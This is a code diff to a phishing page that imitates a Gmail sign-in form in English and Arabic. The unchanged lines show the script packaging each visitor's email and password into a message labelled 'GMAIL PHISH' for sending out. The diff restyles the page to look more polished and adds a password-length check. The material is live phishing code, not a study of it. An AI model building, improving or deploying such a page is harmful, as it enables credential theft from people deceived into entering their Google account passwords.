@@ -11,6 +11,7 @@
       box-sizing: border-box;
     }
     html, body {
+      width: 100%;
       height: 100%;
       font-family: 'Roboto', sans-serif;
       overflow: hidden;
@@ -31,19 +32,20 @@
     }
     .animated-text {
       position: absolute;
-      top: 25px;
+      top: 30px;
       width: 100%;
       text-align: center;
-      font-size: 28px;
+      font-size: 36px;
       font-family: 'Cairo', sans-serif;
       font-weight: bold;
-      background: linear-gradient(270deg, #ff6ec4, #7873f5, #42e695);
-      background-size: 600% 600%;
+      background: linear-gradient(90deg, #ff6ec4, #7873f5, #42e695, #ff6ec4);
+      background-size: 800% 800%;
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      animation: gradient 5s ease infinite;
+      animation: animatedGradient 8s linear infinite;
+      letter-spacing: 1.5px;
     }
-    @keyframes gradient {
+    @keyframes animatedGradient {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
@@ -53,11 +55,12 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: rgba(255, 255, 255, 0.0);
+      background: rgba(0, 0, 0, 0.4);
       border-radius: 20px;
-      padding: 40px 30px;
-      width: 380px;
+      padding: 50px 35px;
+      width: 420px;
       color: #fff;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
     }
     .logo {
       display: flex;
@@ -65,26 +68,26 @@
       margin-bottom: 25px;
     }
     .logo img {
-      width: 90px;
+      width: 100px;
     }
     h2 {
-      font-size: 26px;
+      font-size: 28px;
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
     input {
       width: 100%;
       padding: 14px;
-      margin: 10px 0;
+      margin: 12px 0;
       border: none;
       border-radius: 8px;
-      background: rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.25);
       color: #fff;
-      font-size: 15px;
+      font-size: 16px;
       outline: none;
     }
     input::placeholder {
-      color: #ccc;
+      color: #ddd;
     }
     button {
       width: 100%;
@@ -93,9 +96,9 @@
       color: white;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
+      font-size: 17px;
       cursor: pointer;
-      margin-top: 10px;
+      margin-top: 15px;
       transition: background 0.3s;
     }
     button:hover {
@@ -108,8 +111,8 @@
       margin-top: 15px;
     }
     .spinner div {
-      width: 20px;
-      height: 20px;
+      width: 22px;
+      height: 22px;
       border: 3px solid #fff;
       border-top: 3px solid transparent;
       border-radius: 50%;
@@ -131,7 +134,7 @@
     <h2>Sign in</h2>
     <form id="loginForm">
       <input type="email" id="email" placeholder="Email or phone" required>
-      <input type="password" id="password" placeholder="Enter your password" required>
+      <input type="password" id="password" placeholder="Enter your password (min 6 chars)" required>
       <button type="submit">تسجيل الدخول</button>
       <div class="spinner" id="spinner"><div></div></div>
     </form>
@@ -145,6 +148,13 @@
 
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
+
+      if (password.length < 6) {
+        alert('كلمة المرور يجب أن تكون 6 أحرف على الأقل.');
+        document.getElementById('spinner').style.display = 'none';
+        return;
+      }
+
       const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;
 
       try {
@@ -169,7 +179,7 @@
           document.getElementById('spinner').style.display = 'none';
         }
       } catch (error) {
-        alert('حدث خطأ');
+        alert('حدث خطأ أثناء الإرسال');
         document.getElementById('spinner').style.display = 'none';
       }
     });
